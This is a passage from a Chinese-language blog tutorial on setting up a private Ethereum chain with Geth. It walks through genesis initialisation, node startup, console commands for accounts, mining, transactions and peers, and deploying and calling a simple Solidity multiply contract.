是 1，为了不与公有链网络冲突，运行私有链节点的时候要指定自己的网络 ID。不同 ID 网络的节点无法相互连接。配置文件还对当前挖矿难度 <code>difficulty</code>、区块 Gas 消耗限制 <code>gasLimit</code> 等参数进行了设置。</p><p>在 Geth 1.6+ 中，以太坊提供了一个生成创世块的向导工具：puppeth。并且提供了更适合在私有链中使用的 Clique PoA 共识算法。puppeth 的使用，可以参照《<a href="https://github.com/xiaoping378/blog/blob/master/posts/%E4%BB%A5%E5%A4%AA%E5%9D%8A-%E7%A7%81%E6%9C%89%E9%93%BE%E6%90%AD%E5%BB%BA%E5%88%9D%E6%AD%A5%E5%AE%9E%E8%B7%B5.md" target="_blank" rel="noopener">利用puppeth搭建POA共识的以太坊私链网络</a>》</p><h3 id="二、初始化：写入创世区块"><a href="#二、初始化：写入创世区块" class="headerlink" title="二、初始化：写入创世区块"></a>二、初始化：写入创世区块</h3><p>准备好创世区块配置文件后，需要初始化区块链，将上面的创世区块信息写入到区块链中。首先要新建一个目录用来存放区块链数据，假设新建的数据目录为 <code>~/privatechain/data0</code>，<code>genesis.json</code> 保存在 <code>~/privatechain</code> 中，此时目录结构应该是这样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">privatechain</span><br><span class="line">├── data0</span><br><span class="line">└── genesis.json</span><br></pre></td></tr></table></figure><p>接下来进入 privatechain 中，执行初始化命令：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd privatechain</span><br><span class="line">geth --datadir data0 init genesis.json</span><br></pre></td></tr></table></figure><p>上面的命令的主体是 <code>geth init</code>，表示初始化区块链，命令可以带有选项和参数，其中 <code>--datadir</code> 选项后面跟一个目录名，这里为 data0，表示指定数据存放目录为 data0，genesis.json 是 <code>init</code> 命令的参数。</p><p>运行上面的命令，会读取 <code>genesis.json</code> 文件，根据其中的内容，将创世区块写入到区块链中。如果看到以下的输出内容，说明初始化成功了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">WARN [09-12|04:01:09] No etherbase set and no accounts found as default</span><br><span class="line">INFO [09-12|04:01:09] Allocated cache and file handles         database=/root/work/privatechain/data0/geth/chaindata cache=16 handles=16</span><br><span class="line">INFO [09-12|04:01:09] Writing custom genesis block</span><br><span class="line">INFO [09-12|04:01:09] Successfully wrote genesis state         database=chaindata                                    hash=84e71d…97246e</span><br><span class="line">INFO [09-12|04:01:09] Allocated cache and file handles         database=/root/work/privatechain/data0/geth/lightchaindata cache=16 handles=16</span><br><span class="line">INFO [09-12|04:01:09] Writing custom genesis block</span><br><span class="line">INFO [09-12|04:01:09] Successfully wrote genesis state         database=lightchaindata                                    hash=84e71d…97246e</span><br></pre></td></tr></table></figure><p>初始化成功后，会在数据目录 data0 中生成 <code>geth</code> 和 <code>keystore</code> 两个文件夹，此时目录结构如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">privatechain</span><br><span class="line">├── data0</span><br><span class="line">│   ├── geth</span><br><span class="line">│   │   ├── chaindata</span><br><span class="line">│   │   │   ├── 000001.log</span><br><span class="line">│   │   │   ├── CURRENT</span><br><span class="line">│   │   │   ├── LOCK</span><br><span class="line">│   │   │   ├── LOG</span><br><span class="line">│   │   │   └── MANIFEST-000000</span><br><span class="line">│   │   └── lightchaindata</span><br><span class="line">│   │       ├── 000001.log</span><br><span class="line">│   │       ├── CURRENT</span><br><span class="line">│   │       ├── LOCK</span><br><span class="line">│   │       ├── LOG</span><br><span class="line">│   │       └── MANIFEST-000000</span><br><span class="line">│   └── keystore</span><br><span class="line">└── genesis.json</span><br></pre></td></tr></table></figure><p>其中 <code>geth/chaindata</code> 中存放的是区块数据，<code>keystore</code> 中存放的是账户数据。</p><h3 id="三、启动私有链节点"><a href="#三、启动私有链节点" class="headerlink" title="三、启动私有链节点"></a>三、启动私有链节点</h3><p>初始化完成后，就有了一条自己的私有链，之后就可以启动自己的私有链节点并做一些操作，在终端中输入以下命令即可启动节点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">geth --identity &quot;TestNode&quot; --rpc --rpcport &quot;8545&quot; --datadir data0 --port &quot;30303&quot; --nodiscover console</span><br></pre></td></tr></table></figure><p>上面命令的主体是 <code>geth console</code>，表示启动节点并进入交互式控制台。<br>各选项含义如下：</p><ul><li>–identity：指定节点 ID；</li><li>–rpc：表示开启 HTTP-RPC 服务；</li><li>–rpcport：指定 HTTP-RPC 服务监听端口号（默认为 8545）；</li><li>–datadir：指定区块链数据的存储位置；</li><li>–port：指定和其他节点连接所用的端口号（默认为 30303）；</li><li>–nodiscover：关闭节点发现机制，防止加入有同样初始配置的陌生节点。</li></ul><p>运行上面的命令后，就启动了区块链节点并进入了该节点的控制台：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">Welcome to the Geth JavaScript console!</span><br><span class="line"></span><br><span class="line">instance: Geth/TestNode/v1.6.7-stable-ab5646c5/linux-amd64/go1.8.1</span><br><span class="line"> modules: admin:1.0 debug:1.0 eth:1.0 miner:1.0 net:1.0 personal:1.0 rpc:1.0 txpool:1.0 web3:1.0</span><br></pre></td></tr></table></figure><p>这是一个交互式的 JavaScript 执行环境，在这里面可以执行 JavaScript 代码，其中 <code>&gt;</code> 是命令提示符。在这个环境里也内置了一些用来操作以太坊的 JavaScript 对象，可以直接使用这些对象。这些对象主要包括：</p><ul><li>eth：包含一些跟操作区块链相关的方法；</li><li>net：包含一些查看p2p网络状态的方法；</li><li>admin：包含一些与管理节点相关的方法；</li><li>miner：包含启动&amp;停止挖矿的一些方法；</li><li>personal：主要包含一些管理账户的方法；</li><li>txpool：包含一些查看交易内存池的方法；</li><li>web3：包含了以上对象，还包含一些单位换算的方法。</li></ul><h2 id="控制台操作"><a href="#控制台操作" class="headerlink" title="控制台操作"></a>控制台操作</h2><p>进入以太坊 Javascript Console 后，就可以使用里面的内置对象做一些操作，这些内置对象提供的功能很丰富，比如查看区块和交易、创建账户、挖矿、发送交易、部署智能合约等。</p><p>常用命令有：</p><ul><li>personal.newAccount()：创建账户；</li><li>personal.unlockAccount()：解锁账户；</li><li>eth.accounts：枚举系统中的账户；</li><li>eth.getBalance()：查看账户余额，返回值的单位是 Wei（Wei 是以太坊中最小货币面额单位，类似比特币中的<code>聪</code>，1 ether = 10^18 Wei）；</li><li>eth.blockNumber：列出区块总数；</li><li>eth.getTransaction()：获取交易；</li><li>eth.getBlock()：获取区块；</li><li>miner.start()：开始挖矿；</li><li>miner.stop()：停止挖矿；</li><li>web3.fromWei()：Wei 换算成以太币；</li><li>web3.toWei()：以太币换算成 Wei；</li><li>txpool.status：交易池中的状态；</li><li>admin.addPeer()：连接到其他节点；</li></ul><p>这些命令支持 <code>Tab</code> 键自动补全，具体用法如下。</p><h3 id="一、创建账户"><a href="#一、创建账户" class="headerlink" title="一、创建账户"></a>一、创建账户</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; personal.newAccount()</span><br><span class="line">Passphrase:</span><br><span class="line">Repeat passphrase:</span><br><span class="line">&quot;0x3443ffb2a5ce3f4b80080791e0fde16a3fac2802&quot;</span><br><span class="line">&gt; INFO [09-12|05:55:44] New wallet appeared                     url=keystore:///root/work/privatech… status=Locked</span><br></pre></td></tr></table></figure><p>输入两遍密码后，会生成账户地址。</p><p>再创建一个账户：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; personal.newAccount()</span><br><span class="line">Passphrase:</span><br><span class="line">Repeat passphrase:</span><br><span class="line">&quot;0x02bee2a1582bbf58c42bbdfe7b8db4685d4d4c62&quot;</span><br><span class="line">&gt; INFO [09-12|06:10:45] New wallet appeared                     url=keystore:///root/work/privatech… status=Locked</span><br></pre></td></tr></table></figure><p>查看刚刚创建的两个账户：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; eth.accounts</span><br><span class="line">[&quot;0x3443ffb2a5ce3f4b80080791e0fde16a3fac2802&quot;, &quot;0x02bee2a1582bbf58c42bbdfe7b8db4685d4d4c62&quot;]</span><br></pre></td></tr></table></figure><h3 id="二、查看账户余额"><a href="#二、查看账户余额" class="headerlink" title="二、查看账户余额"></a>二、查看账户余额</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; eth.getBalance(eth.accounts[0])</span><br><span class="line">0</span><br><span class="line">&gt; eth.getBalance(eth.accounts[1])</span><br><span class="line">0</span><br></pre></td></tr></table></figure><h3 id="三、启动-amp-停止挖矿"><a href="#三、启动-amp-停止挖矿" class="headerlink" title="三、启动&amp;停止挖矿"></a>三、启动&amp;停止挖矿</h3><p>启动挖矿：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; miner.start(1)</span><br></pre></td></tr></table></figure><p>其中 start 的参数表示挖矿使用的线程数。第一次启动挖矿会先生成挖矿所需的 DAG 文件，这个过程有点慢，等进度达到 100% 后，就会开始挖矿，此时屏幕会被挖矿信息刷屏。</p><p>停止挖矿，在 console 中输入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; miner.stop()</span><br></pre></td></tr></table></figure><p>挖到一个区块会奖励5个以太币，挖矿所得的奖励会进入矿工的账户，这个账户叫做 coinbase，默认情况下 coinbase 是本地账户中的第一个账户，可以通过 miner.setEtherbase() 将其他账户设置成 coinbase。</p><h3 id="四、发送交易"><a href="#四、发送交易" class="headerlink" title="四、发送交易"></a>四、发送交易</h3><p>目前，账户 0 已经挖到了 3 个块的奖励，账户 1 的余额还是0：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; eth.getBalance(eth.accounts[0])</span><br><span class="line">15000000000000000000</span><br><span class="line">&gt; eth.getBalance(eth.accounts[1])</span><br><span class="line">0</span><br></pre></td></tr></table></figure><p>我们要从账户 0 向账户 1 转账，所以要先解锁账户 0，才能发起交易：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; personal.unlockAccount(eth.accounts[0])</span><br><span class="line">Unlock account 0x3443ffb2a5ce3f4b80080791e0fde16a3fac2802</span><br><span class="line">Passphrase: </span><br><span class="line">true</span><br></pre></td></tr></table></figure><p>发送交易，账户 0 -&gt; 账户 1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; amount = web3.toWei(5,&apos;ether&apos;)</span><br><span class="line">&quot;5000000000000000000&quot;</span><br><span class="line">&gt; eth.sendTransaction(&#123;from:eth.accounts[0],to:eth.accounts[1],value:amount&#125;)</span><br><span class="line">INFO [09-12|07:38:12] Submitted transaction                    fullhash=0x9f5e61f3d686f793e2df6378d1633d7a9d1df8ec8c597441e1355112d102a6ce recipient=0x02bee2a1582bbf58c42bbdfe7b8db4685d4d4c62</span><br><span class="line">&quot;0x9f5e61f3d686f793e2df6378d1633d7a9d1df8ec8c597441e1355112d102a6ce&quot;</span><br></pre></td></tr></table></figure><p>此时如果没有挖矿，用 <code>txpool.status</code> 命令可以看到本地交易池中有一个待确认的交易，可以使用 <code>eth.getBlock(&quot;pending&quot;, true).transactions</code> 查看当前待确认交易。</p><p>使用 <code>miner.start()</code> 命令开始挖矿：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; miner.start(1);admin.sleepBlocks(1);miner.stop();</span><br></pre></td></tr></table></figure><p>新区块挖出后，挖矿结束，查看账户 1 的余额，已经收到了账户 0 的以太币：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; web3.fromWei(eth.getBalance(eth.accounts[1]),&apos;ether&apos;)</span><br><span class="line">5</span><br></pre></td></tr></table></figure><h3 id="五、查看交易和区块"><a href="#五、查看交易和区块" class="headerlink" title="五、查看交易和区块"></a>五、查看交易和区块</h3><p>查看当前区块总数：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; eth.blockNumber</span><br><span class="line">4</span><br></pre></td></tr></table></figure><p>通过交易 Hash 查看交易（Hash 值包含在上面交易返回值中）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&gt; eth.getTransaction(&quot;0x9f5e61f3d686f793e2df6378d1633d7a9d1df8ec8c597441e1355112d102a6ce&quot;)</span><br><span class="line">&#123;</span><br><span class="line">  blockHash: &quot;0xdc1fb4469bf4613821c303891a71ff0d1f5af9af8c10efdd8bcd8b518533ee7d&quot;,</span><br><span class="line">  blockNumber: 4,</span><br><span class="line">  from: &quot;0x3443ffb2a5ce3f4b80080791e0fde16a3fac2802&quot;,</span><br><span class="line">  gas: 90000,</span><br><span class="line">  gasPrice: 18000000000,</span><br><span class="line">  hash: &quot;0x9f5e61f3d686f793e2df6378d1633d7a9d1df8ec8c597441e1355112d102a6ce&quot;,</span><br><span class="line">  input: &quot;0x&quot;,</span><br><span class="line">  nonce: 0,</span><br><span class="line">  r: &quot;0x4214d2d8d92efc3aafb515d2413ecd45ab3695d9bcc30d9c7c06932de829e064&quot;,</span><br><span class="line">  s: &quot;0x42822033225a2ef662b9b448576e0271b9958e1f4ec912c259e01c84bd1f6681&quot;,</span><br><span class="line">  to: &quot;0x02bee2a1582bbf58c42bbdfe7b8db4685d4d4c62&quot;,</span><br><span class="line">  transactionIndex: 0,</span><br><span class="line">  v: &quot;0x824&quot;,</span><br><span class="line">  value: 5000000000000000000</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过区块号查看区块：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&gt; eth.getBlock(4)</span><br><span class="line">&#123;</span><br><span class="line">  difficulty: 131072,</span><br><span class="line">  extraData: &quot;0xd783010607846765746887676f312e382e31856c696e7578&quot;,</span><br><span class="line">  gasLimit: 3153874,</span><br><span class="line">  gasUsed: 21000,</span><br><span class="line">  hash: &quot;0xdc1fb4469bf4613821c303891a71ff0d1f5af9af8c10efdd8bcd8b518533ee7d&quot;,</span><br><span class="line">  logsBloom: &quot;0x00000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000&quot;,</span><br><span class="line">  miner: &quot;0x3443ffb2a5ce3f4b80080791e0fde16a3fac2802&quot;,</span><br><span class="line">  mixHash: &quot;0x6df88079cf4fbfae98ad7588926fa30becddf4b8b55f93f0380d82ce0533338c&quot;,</span><br><span class="line">  nonce: &quot;0x39455ee908666993&quot;,</span><br><span class="line">  number: 4,</span><br><span class="line">  parentHash: &quot;0x14fe27755d6fcc704f6b7018d5dc8193f702d89f2c7807bf6f0e402a2b0a29d9&quot;,</span><br><span class="line">  receiptsRoot: &quot;0xfcb5b5cc322998562d96339418d08ad8e7c5dd87935f9a3321e040344e3fd095&quot;,</span><br><span class="line">  sha3Uncles: &quot;0x1dcc4de8dec75d7aab85b567b6ccd41ad312451b948a7413f0a142fd40d49347&quot;,</span><br><span class="line">  size: 651,</span><br><span class="line">  stateRoot: &quot;0xdd4a0ce76c7e0ff149853dce5bb4f99592fb1bc3c5e87eb07518a0235ffacd8c&quot;,</span><br><span class="line">  timestamp: 1505202063,</span><br><span class="line">  totalDifficulty: 525312,</span><br><span class="line">  transactions: [&quot;0x9f5e61f3d686f793e2df6378d1633d7a9d1df8ec8c597441e1355112d102a6ce&quot;],</span><br><span class="line">  transactionsRoot: &quot;0xbb909845183e037b15d24fe9ad1805fd00350ae04841aa774be6af96e76fdbf9&quot;,</span><br><span class="line">  uncles: []</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="六、连接到其他节点"><a href="#六、连接到其他节点" class="headerlink" title="六、连接到其他节点"></a>六、连接到其他节点</h3><p>可以通过 <code>admin.addPeer()</code> 方法连接到其他节点，两个节点要要指定相同的 chainID。</p><p>假设有两个节点：节点一和节点二，chainID 都是 1024，通过下面的步骤就可以从节点一连接到节点二。</p><p>首先要知道节点二的 enode 信息，在节点二的 JavaScript console 中执行下面的命令查看 enode 信息：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; admin.nodeInfo.enode</span><br><span class="line">&quot;enode://d465bcbd5c34da7f4b8e00cbf9dd18e7e2c38fbd6642b7435f340c7d5168947ff2b822146e1dc1b07e02f7c15d5ca09249a92f1d0caa34587c9b2743172259ee@[::]:30303&quot;</span><br></pre></td></tr></table></figure><p>然后在节点一的 JavaScript console 中执行 admin.addPeer()，就可以连接到节点二：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&gt; admin.addPeer(&quot;enode://d465bcbd5c34da7f4b8e00cbf9dd18e7e2c38fbd6642b7435f340c7d5168947ff2b822146e1dc1b07e02f7c15d5ca09249a92f1d0caa34587c9b2743172259ee@127.0.0.1:30304&quot;)</span><br></pre></td></tr></table></figure><p>addPeer() 的参数就是节点二的 enode 信息，注意要把 enode 中的 <code>[::]</code> 替换成节点二的 IP 地址。连接成功后，节点二就会开始同步节点一的区块，同步完成后，任意一个节点开始挖矿，另一个节点会自动同步区块，向任意一个节点发送交易，另一个节点也会收到该笔交易。</p><p>通过 <code>admin.peers</code> 可以查看连接到的其他节点信息，通过 <code>net.peerCount</code> 可以查看已连接到的节点数量。</p><p>除了上面的方法，也可以在启动节点的时候指定 <code>--bootnodes</code> 选项连接到其他节点。</p><h2 id="智能合约操作"><a href="#智能合约操作" class="headerlink" title="智能合约操作"></a>智能合约操作</h2><h3 id="一、创建和编译智能合约"><a href="#一、创建和编译智能合约" class="headerlink" title="一、创建和编译智能合约"></a>一、创建和编译智能合约</h3><p>新建一个 Solidity 智能合约文件，命名为 <code>testContract.sol</code>，该合约包含一个方法 <code>multiply()</code>，将输入的两个数相乘后输出：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.4.0;</span><br><span class="line">contract TestContract</span><br><span class="line">&#123;</span><br><span class="line">    function multiply(uint a, uint b) returns (uint)</span><br><span class="line">    &#123;</span><br><span class="line">        return a * b;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译智能合约，获得编译后的 EVM 二进制码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ solc --bin testContract.sol</span><br><span class="line"></span><br><span class="line">======= testContract.sol:TestContract =======</span><br><span class="line">Binary:</span><br><span class="line">6060604052341561000f57600080fd5b5b60b48061001e6000396000f30060606040526000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063165c4a1614603d575b600080fd5b3415604757600080fd5b60646004808035906020019091908035906020019091905050607a565b6040518082815260200191505060405180910390f35b600081830290505b929150505600a165627a7a72305820b494a4b3879b3810accf64d4cc3e1be55f2f4a86f49590b8a9b8d7009090a5d30029</span><br></pre></td></tr></table></figure><p>再用 solc 获取智能合约的 JSON ABI（Application Binary Interface），其中指定了合约接口，包括可调用的合约方法、变量、事件等：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ solc --abi testContract.sol</span><br><span class="line"></span><br><span class="line">======= testContract.sol:TestContract =======</span><br><span class="line">Contract JSON ABI</span><br><span class="line">[&#123;&quot;constant&quot;:false,&quot;inputs&quot;:[&#123;&quot;name&quot;:&quot;a&quot;,&quot;type&quot;:&quot;uint256&quot;&#125;,&#123;&quot;name&quot;:&quot;b&quot;,&quot;type&quot;:&quot;uint256&quot;&#125;],&quot;name&quot;:&quot;multiply&quot;,&quot;outputs&quot;:[&#123;&quot;name&quot;:&quot;&quot;,&quot;type&quot;:&quot;uint256&quot;&#125;],&quot;payable&quot;:false,&quot;stateMutability&quot;:&quot;nonpayable&quot;,&quot;type&quot;:&quot;function&quot;&#125;]</span><br></pre></td></tr></table></figure><p>回到 Geth 的控制台，用变量 <code>code</code> 和 <code>abi</code> 记录上面两个值，注意在 code 前加上 <code>0x</code> 前缀：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; code = &quot;0x6060604052341561000f57600080fd5b5b60b48061001e6000396000f30060606040526000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063165c4a1614603d575b600080fd5b3415604757600080fd5b60646004808035906020019091908035906020019091905050607a565b6040518082815260200191505060405180910390f35b600081830290505b929150505600a165627a7a72305820b494a4b3879b3810accf64d4cc3e1be55f2f4a86f49590b8a9b8d7009090a5d30029&quot;</span><br><span class="line">&gt; abi = [&#123;&quot;constant&quot;:false,&quot;inputs&quot;:[&#123;&quot;name&quot;:&quot;a&quot;,&quot;type&quot;:&quot;uint256&quot;&#125;,&#123;&quot;name&quot;:&quot;b&quot;,&quot;type&quot;:&quot;uint256&quot;&#125;],&quot;name&quot;:&quot;multiply&quot;,&quot;outputs&quot;:[&#123;&quot;name&quot;:&quot;&quot;,&quot;type&quot;:&quot;uint256&quot;&#125;],&quot;payable&quot;:false,&quot;stateMutability&quot;:&quot;nonpayable&quot;,&quot;type&quot;:&quot;function&quot;&#125;]</span><br></pre></td></tr></table></figure><h3 id="二、部署智能合约"><a href="#二、部署智能合约" class="headerlink" title="二、部署智能合约"></a>二、部署智能合约</h3><p>这里使用账户 0 来部署合约，首先解锁账户：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; personal.unlockAccount(eth.accounts[0])</span><br><span class="line">Unlock account 0x3443ffb2a5ce3f4b80080791e0fde16a3fac2802</span><br><span class="line">Passphrase:</span><br><span class="line">true</span><br></pre></td></tr></table></figure><p>发送部署合约的交易：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&gt; myContract = eth.contract(abi)</span><br><span class="line">...</span><br><span class="line">&gt; contract = myContract.new(&#123;from:eth.accounts[0],data:code,gas:1000000&#125;)</span><br><span class="line"></span><br><span class="line">INFO [09-12|08:05:19] Submitted contract creation              fullhash=0x0a7dfa9cac7ef836a72ed1d5bbfa65c0220347cde4efb067a0b03b15fb70bce1 contract=0x7cbe4019e993f9922b8233502d94890099ee59e6</span><br><span class="line">&#123;</span><br><span class="line">  abi: [&#123;</span><br><span class="line">      constant: false,</span><br><span class="line">      inputs: [&#123;...&#125;, &#123;...&#125;],</span><br><span class="line">      name: &quot;multiply&quot;,</span><br><span class="line">      outputs: [&#123;...&#125;],</span><br><span class="line">      payable: false,</span><br><span class="line">      stateMutability: &quot;nonpayable&quot;,</span><br><span class="line">      type: &quot;function&quot;</span><br><span class="line">  &#125;],</span><br><span class="line">  address: undefined,</span><br><span class="line">  transactionHash: &quot;0x0a7dfa9cac7ef836a72ed1d5bbfa65c0220347cde4efb067a0b03b15fb70bce1&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此时如果没有挖矿，用 <code>txpool.status</code> 命令可以看到本地交易池中有一个待确认的交易。使用下面的命令查看当前待确认的交易：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[&#123;</span><br><span class="line">    blockHash: &quot;0xfedd6fef9f25e96a5a20b5ffcd152e9fe05d193ae0989c25d6197d2441c2c09b&quot;,</span><br><span class="line">    blockNumber: 5,</span><br><span class="line">    from: &quot;0x3443ffb2a5ce3f4b80080791e0fde16a3fac2802&quot;,</span><br><span class="line">    gas: 1000000,</span><br><span class="line">    gasPrice: 18000000000,</span><br><span class="line">    hash: &quot;0x0a7dfa9cac7ef836a72ed1d5bbfa65c0220347cde4efb067a0b03b15fb70bce1&quot;,</span><br><span class="line">    input: &quot;0x6060604052341561000f57600080fd5b5b60b48061001e6000396000f30060606040526000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff168063165c4a1614603d575b600080fd5b3415604757600080fd5b60646004808035906020019091908035906020019091905050607a565b6040518082815260200191505060405180910390f35b600081830290505b929150505600a165627a7a72305820b494a4b3879b3810accf64d4cc3e1be55f2f4a86f49590b8a9b8d7009090a5d30029&quot;,</span><br><span class="line">    nonce: 3,</span><br><span class="line">    r: &quot;0xfe7139a31694a36f946e7182c35c52a21bf31d33994490815f63f6674e84dc93&quot;,</span><br><span class="line">    s: &quot;0x4701a984ee93d2a323fac55547b31534b11915599de75202a1d62061241fefbf&quot;,</span><br><span class="line">    to: null,</span><br><span class="line">    transactionIndex: 0,</span><br><span class="line">    v: &quot;0x823&quot;,</span><br><span class="line">    value: 0</span><br><span class="line">&#125;]</span><br></pre></td></tr></table></figure><p>使用 <code>miner.start()</code> 命令开始挖矿，一段时间后交易会被确认，随新区块进入区块链。</p><h3 id="三、调用智能合约"><a href="#三、调用智能合约" class="headerlink" title="三、调用智能合约"></a>三、调用智能合约</h3><p>使用以下命令发送交易，<code>sendTransaction</code> 方法的前几个参数应该与合约中 <code>multiply</code> 方法的输入参数对应。这种情况下，交易会通过挖矿记录到区块链中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; contract.multiply(2, 4, &#123;from:eth.accounts[0]&#125;)</span><br><span class="line"></span><br><span class="line">INFO [09-12|08:24:14] Submitted transaction                    fullhash=0x29b47d580ba6ccb2445aa3ebdcb14567bd5cbc6004edef7a4064c36e0606bca2 